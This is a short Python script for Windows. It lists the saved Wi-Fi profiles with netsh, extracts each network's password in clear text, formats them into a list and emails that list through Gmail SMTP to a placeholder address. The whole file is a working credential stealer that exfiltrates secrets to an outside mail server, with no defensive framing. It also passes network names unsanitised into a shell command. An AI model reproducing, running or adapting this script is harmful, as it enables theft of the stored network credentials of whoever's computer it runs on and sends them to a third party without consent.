#!/usr/bin/python3
import subprocess, re, smtplib

class WifiPass:
    #function to search network names present
    def network_search(self):
        network_search_op = subprocess.check_output("netsh wlan show profile", shell=True)        
        #re.findall finds all instances of expression instead of the only 1st
        network_names_list = re.findall("(?:Profile\s*:\s)(.*)", network_search_op.decode())
        return network_names_list

    #function to search the password with network names
    def pass_search(self,network_names):
        pass_list = []
            
        for network in network_names:
            pass_cmd_op = subprocess.check_output( f"netsh wlan show profile \"{network}\" key=clear" ,shell=True)
            pass_search = re.search("(?:Key Content\s*:\s*)(.*)", pass_cmd_op.decode()).group(1)
            pass_list.append(pass_search)
        return pass_list

    #function to format result nicely
    def formatting_result(self,network_name, its_password):
        dev_list = ""
        for num in range(len(network_name)):
            # net = network_name[num]
            # passwd = its_password[num]
            string = f'{network_name[num]}\t\t\t{its_password[num]}'
            dev_list = dev_list + "\n" + string
        return dev_list
    #main execution of program
    def execute(self):
        networks = self.network_search()
        passwords = self.pass_search(networks)
        result = self.formatting_result(networks,passwords)
        return result


#turn on less secure apps in your email to make this work
def send_email(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email, message)
    server.quit()

msg = WifiPass().execute()

send_email("youremail@email.com","pass",msg)
